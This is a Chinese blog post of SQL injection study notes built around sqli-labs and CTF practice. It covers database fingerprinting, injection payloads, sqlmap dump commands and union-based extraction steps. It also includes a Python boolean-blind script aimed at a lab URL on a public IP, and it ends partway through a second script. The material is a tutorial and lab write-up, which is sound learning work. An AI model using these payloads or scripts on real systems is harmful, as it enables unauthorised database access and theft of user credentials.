<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SQL, Hexo">
    <meta name="description" content="SQL从0到一
判断数据库类型根据端口判断 
Oracle：默认端口1521 
SQL Server：默认端口1433 
MySQL：默认端口3306
根据数据库特有函数来判断 
len和length
len()：SQL Server 、M">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SQL | Hexo</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hexo</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hexo</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SQL</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-08-10
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>SQL从0到一</p>
<h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><p><strong>根据端口判断</strong> </p>
<p>Oracle：默认端口1521 </p>
<p>SQL Server：默认端口1433 </p>
<p>MySQL：默认端口3306</p>
<p><strong>根据数据库特有函数来判断</strong> </p>
<p><strong>len和length</strong></p>
<p>len()：SQL Server 、MySQL以及db2返回长度的函数。</p>
<p>length()：Oracle和INFORMIX返回长度的函数。</p>
<p>**version和@@version **</p>
<p>version()：MySQL查询版本信息的函数</p>
<p>@@version：MySQL和SQL Server查询版本信息的函数</p>
<p><strong>substring和substr</strong></p>
<p> MySQL两个函数都可以使用 </p>
<p>Oracle只可调用substr</p>
<p> SQL Server只可调用substring</p>
<p><strong>根据特殊符号进行判断</strong> </p>
<p>&#x2F;*是MySQL、sqlite数据库的注释符</p>
<p>–是Oracle和SQL Server支持的注释符</p>
<p>;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库 </p>
<p>#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;**&#x2F;</p>
<p><strong>根据数据库对字符串的处理方式判断</strong> </p>
<p>1、MySQL</p>
<p>?id&#x3D;1 and ‘a’+’b’&#x3D;’ab’</p>
<p>?id&#x3D;1 and CONCAT(‘a’,’b’)&#x3D;’ab’ </p>
<p>2、Oracle</p>
<p>?id&#x3D;1 and ‘a’||’b’&#x3D;’ab’ </p>
<p>?id&#x3D;1 and CONCAT(‘a’,’b’)&#x3D;’ab’</p>
<p>3、SQL Server</p>
<p>?id&#x3D;1 and ‘a’+’b’&#x3D;’ab’ </p>
<p><strong>根据数据库特有的数据表来判断</strong></p>
<p>1、MySQL（version&gt;5.0）</p>
<p>?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</p>
<p>2、Oracle</p>
<p>?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</p>
<p>3、SQL Server</p>
<p>?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</p>
<p>4、Sqlite</p>
<p>?id&#x3D;1’ union select 1,2,(select sql from sqlite_master limit 0,1),4–</p>
<p> <strong>根据盲注特别函数判断</strong> </p>
<p>1、MySQL</p>
<p>BENCHMARK(1000000,ENCODE(‘QWE’,’ASD’))</p>
<p>SLEEP(5)</p>
<p>2、PostgreSQL</p>
<p>PG_SLEEP(5)</p>
<p>GENERATE_SERIES(1,1000000)</p>
<p>3、SQL Server</p>
<p>WAITFOR DELAY ‘0:0:5’</p>
<p>4、Sqlite</p>
<p>1’ or (case when(substr(sqlite_version(),1,1)&#x3D;’3’) then randomblob(1000000000) else 0 end)–</p>
<h2 id="SQL语法细节"><a href="#SQL语法细节" class="headerlink" title="SQL语法细节"></a>SQL语法细节</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1-- -</span><br><span class="line">%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3</span><br><span class="line"></span><br><span class="line">&quot; or 1=1-- -</span><br><span class="line">%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3</span><br><span class="line"></span><br><span class="line">&#x27; || 1==1//</span><br><span class="line">%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f</span><br><span class="line"></span><br><span class="line">&quot; || 1==1//</span><br><span class="line">%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1、使用&#96; 而不是 ‘ 的一些解释：</p>
<p>两者在linux下和windows下不同，linux下不区分，windows下区分。</p>
<p>单引号 ’ 或双引号主要用于 字符串的引用符号</p>
<p>反勾号 &#96; 数据库、表、索引、列和别名用的是引用符是反勾号 </p>
<p>有MYSQL保留字作为字段的，必须加上反引号来区分！！！</p>
<p>如果是数字，使用反引号。</p>
<p>2、如果1’一直有正常回显，不妨试试-1’因为正常回显可能占据你需要的回显。</p>
<p>3、字符串被限制长度输出：使用mid()函数，mid(str,first,long)；str是字符串，first是第几个字符开始，long是长度。</p>
<p>4、爆字段的时候，如果字段太多，导致打到了输出长度限制，可以把group_cat()改成MAX()试试，因为flag一般是最长的。</p>
<p>5、若有多个变量参与注入，尝试多次改变变量数字，变量数字可以代表变量在表中的位置。</p>
<p>6、万能密码：1 || 1&#x3D;1 limit 0,1</p>
<p>7、desc + 库名，可以查询库的结构</p>
<p>mysql 8 新语句TABLE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table test.ctf;</span><br></pre></td></tr></table></figure>

<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>如果题目无过滤可以直接使用sqlmap，有过滤还是先测试过滤，手注比较好<br>多用-1代替1,用1正常的回显可能覆盖掉我需要的回显。<br>sqlmap基本命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;……?id=-1&quot;                  					   //测试注入点,注入方式</span><br><span class="line">sqlmap.py -u &quot;……?id=-1&quot; -dbs             				       //爆库名</span><br><span class="line">sqlmap.py -u &quot;……?id=-1&quot; -D 库名 --tables  				      //爆表名</span><br><span class="line">sqlmap.py -u &quot;……?id=-1&quot; -D 库名 -T 表名 --columns     	    	 //爆列名</span><br><span class="line">sqlmap.py -u &quot;……?id=-1&quot; -D 库名 -T 表名 -C 列名 --dump         	//爆字段</span><br></pre></td></tr></table></figure>

<p>POST注入时，sqlmap -u  url  –data&#x3D;”name&#x3D;value” 的形式</p>
<h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p>
<p><img src="/.io//image-20250604181759011-1754809764535-1.png" alt="image-20250604181759011"></p>
<p>1’union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#</p>
<h3 id="1，字符型"><a href="#1，字符型" class="headerlink" title="1，字符型"></a>1，字符型</h3><p><strong>一，判断是否注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250520202518011-1754809764535-2.png" alt="image-20250520202518011"></p>
<p>less1输入?id&#x3D;1’’’报错为near 1‘’‘多一个’，所以闭合符号为’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2--+</span><br><span class="line">?id=1&#x27; and 1=1--+</span><br></pre></td></tr></table></figure>

<p><strong>二，判断select语句中有几列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; order by 4 --+</span><br><span class="line">4的时候报错，所以字段数量为3</span><br></pre></td></tr></table></figure>

<p><strong>三，爆显示位</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 &#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250520204531145-1754809764535-3.png" alt="image-20250520204531145"></p>
<p>显示位 是2，3</p>
<p><strong>四，获取当前版本号和数据名，这个就涉及mysql数据库的一些函数</strong></p>
<p>利用函数来收集数据库名信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 &#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>

<p>数据库函数有以下：</p>
<p>用户：user()</p>
<p>当前数据库：database()</p>
<p>数据库版本：version()</p>
<p>@@hostname （用户）</p>
<p>@@datadir   (数据库在文件的位置)</p>
<p>@@version  （版本)</p>
<p>@@version_compile_OS  (操作系统版本)</p>
<p>如果为root用户，就可以访问information_schema数据库。</p>
<p><img src="/.io//image-20250520204942477-1754809764536-4.png" alt="image-20250520204942477"></p>
<p>当前数据库名称为security</p>
<p><strong>五通过union查询数据库</strong></p>
<p>查询指定数据库中的表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 &#x27; union select 1,table_schema,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<p>information_schema.tables表示该数据库下的tables表，点表示下一级</p>
<p><strong>mysql &#x3D;&gt; 5 的版本中存在一个名为 information_schema的库</strong></p>
<img src="/.io//image-20250520205603364-1754809764536-5.png" alt="image-20250520205603364" style="zoom:67%;">

<p>根据查询结果可知，数据库security中有三个表：emails,referers,uagents,users</p>
<p><strong>爆表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,group_concat(table_name),3 from mysql.innodb_table_stats where database_name=&quot;数据库名&quot; --+</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select 1,(select group_concat(table_name) from sys.schema_auto_increment_columns)--+</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_table_index</span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>用 sys.schema_auto_increment_columns 来注表名</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>六查询指定数据库指定表中的列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 &#x27; union select 1,table_name,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>

<img src="/.io//image-20250520211141681-1754809764536-7.png" alt="image-20250520211141681" style="zoom:67%;">

<p>查询information_schema数据库下的columns表里面且table_name&#x3D;users字段内容。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</p>
<p><strong>七获取列里面的内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 &#x27; union select 1,2,group_concat(username,password) from users --+</span><br></pre></td></tr></table></figure>

<h3 id="2，数字型"><a href="#2，数字型" class="headerlink" title="2，数字型"></a>2，数字型</h3><p>整型闭合</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=input					//整型闭合</span><br><span class="line"></span><br><span class="line">用户在注入点输入（即更换input）</span><br><span class="line">1 页面显示正常</span><br><span class="line">1&#x27; 页面显示错误</span><br><span class="line">1&quot; 页面显示错误</span><br></pre></td></tr></table></figure>

<p>单引号闭合</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;input&#x27;				//单引号闭合</span><br><span class="line"></span><br><span class="line">用户在注入点输入（即更换input）</span><br><span class="line">1 页面显示正常</span><br><span class="line">1&#x27; 页面出现错误</span><br><span class="line">1&quot; 页面显示正常</span><br></pre></td></tr></table></figure>

<p>双引号闭合</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&quot;input&quot;				//双引号闭合</span><br><span class="line"></span><br><span class="line">用户在注入点输入（即更换input）</span><br><span class="line">1 页面显示正常</span><br><span class="line">1&#x27; 页面显示正常</span><br><span class="line">1&quot; 页面显示错误</span><br></pre></td></tr></table></figure>

<p>单引号加括号闭合</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=(&#x27;input&#x27;)			//单引号加括号闭合</span><br><span class="line"></span><br><span class="line">用户在注入点输入（即更换input）</span><br><span class="line">1 页面显示正常</span><br><span class="line">1&#x27; 页面显示错误</span><br><span class="line">1&quot; 页面显示正常</span><br><span class="line"></span><br><span class="line">题外话：（一般情况下你想不到）</span><br><span class="line">1&#x27;) 页面显示错误</span><br><span class="line">1&quot;) 页面显示正常</span><br></pre></td></tr></table></figure>

<p>双引号加括号闭合</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=(&quot;input&quot;)			//双引号加括号闭合</span><br><span class="line"></span><br><span class="line">用户在注入点输入（即更换input）</span><br><span class="line">1 页面显示正常</span><br><span class="line">1&#x27; 页面显示正常</span><br><span class="line">1&quot; 页面显示错误</span><br></pre></td></tr></table></figure>

<p>步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br></pre></td></tr></table></figure>

<p>第3关是1’) ，第4关是1”)  </p>
<h3 id="3，二分法布尔"><a href="#3，二分法布尔" class="headerlink" title="3，二分法布尔"></a>3，二分法布尔</h3><p>常用函数： </p>
<p>mid()： MID(column_name,start,length) </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select mid(column_name,1,2) from table_name;</span><br></pre></td></tr></table></figure>

<p>**ord()、unicode()、ascii()**函数返回字符串参数中的第一个字符的字符代码。如果第一个字符是单字节字符，函数返回字符的 ASCII 值；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(mid(database(),&#123;i&#125;,1)) = ……</span><br></pre></td></tr></table></figure>

<p>length()：返回字符串长度<br>substr()：跟mid一样，逗号过滤了可以用form for代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(database(),1,1)</span><br><span class="line">substr(database() from 1 for 1)</span><br></pre></td></tr></table></figure>

<p>ascii()：接受字符表达式并返回字符表达式最左侧字符的ASCII代码值。<br>if()：IF(条件表达式,值1,值2)</p>
<p>●如果条件表达式为True，返回值1，为False,返回值2.<br>●返回值可以是任何值，比如：数值，文本，日期，空值，NULL，数学表达式，函数等。</p>
<p>||：当||后面条件为真时返回后面的值，为假时返回前面的值，这就是判断盲注语句是否成立的关键<br>CHAR、chr：与 ASCII 相反，将数值转换为对应的字符。例如，CHAR(65) 返回 A。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxl862002755/p/13150151.html">Sqli-labs-第五关详解 - Dorgan_Chen - 博客园 (cnblogs.com)</a>报错注入的方法</p>
<p>第五关布尔盲注</p>
<p>布尔盲注主要用到length(),ascii() ,substr()这三个函数</p>
<p><img src="/.io//image-20250522210204137-1754809764536-6.png" alt="image-20250522210204137"></p>
<p>二分法get传参，因为正确返回的是You are in…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8.130.67.146:8081/Less-5?id=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def inj():</span><br><span class="line">    #payload = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;</span><br><span class="line">    #payload=&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;)&quot;</span><br><span class="line">    payload = &quot;(select group_concat(id,email_id) from emails)&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        found = False</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            t = requests.get(url, params=&#123;</span><br><span class="line">                &quot;id&quot;: f&quot;a&#x27; or ord(mid(&#123;payload&#125;,&#123;i&#125;,1))&lt;&#123;mid&#125;#&quot;,</span><br><span class="line">            &#125;).text</span><br><span class="line">            # print(t)</span><br><span class="line">            # print(mid)</span><br><span class="line">            if &quot;You&quot; in t:</span><br><span class="line">                high = mid</span><br><span class="line">            else:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class="line">            break</span><br><span class="line">        result += chr(mid - 1)</span><br><span class="line">        print(result)</span><br><span class="line">        found = True</span><br><span class="line">    print(&quot;Found:&quot;, result)</span><br><span class="line">inj()</span><br></pre></td></tr></table></figure>

<p>post传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 